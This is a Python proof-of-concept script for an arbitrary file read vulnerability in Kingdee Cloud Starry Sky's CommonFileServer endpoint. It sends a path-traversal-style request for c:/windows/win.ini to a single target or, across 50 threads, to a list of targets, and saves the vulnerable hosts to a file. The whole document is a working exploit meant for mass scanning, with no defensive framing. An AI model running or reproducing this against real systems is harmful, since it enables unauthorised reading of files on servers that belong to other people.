import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """


███████╗██╗██╗     ███████╗    ██████╗ ███████╗ █████╗ ██████╗ ██╗███╗   ██╗ ██████╗ 
██╔════╝██║██║     ██╔════╝    ██╔══██╗██╔════╝██╔══██╗██╔══██╗██║████╗  ██║██╔════╝ 
█████╗  ██║██║     █████╗█████╗██████╔╝█████╗  ███████║██║  ██║██║██╔██╗ ██║██║  ███╗
██╔══╝  ██║██║     ██╔══╝╚════╝██╔══██╗██╔══╝  ██╔══██║██║  ██║██║██║╚██╗██║██║   ██║
██║     ██║███████╗███████╗    ██║  ██║███████╗██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝
╚═╝     ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
                                                                                     
                                             author:zm
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="This is Kingdee Cloud Starry Sky CommonFileserver arbitrary file reading vulnerability")
    parser.add_argument('-u','-url',dest='url',type=str,help="Please input your URL")
    parser.add_argument('-f','-file',dest='file',type=str,help="Please input your File path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/CommonFileServer/c:/windows/win.ini"
    headers = {
        'accept': '*/*',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    }
    try:
        res1 = requests.get(url=target+payload,headers=headers,verify=False,timeout=10)
        if res1.status_code == 200:
            print(f"[+]{target} have loophole “{target+payload}”")
            with open ('result.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target} have loophole")
    except:
        pass

if __name__ == "__main__":
    main()
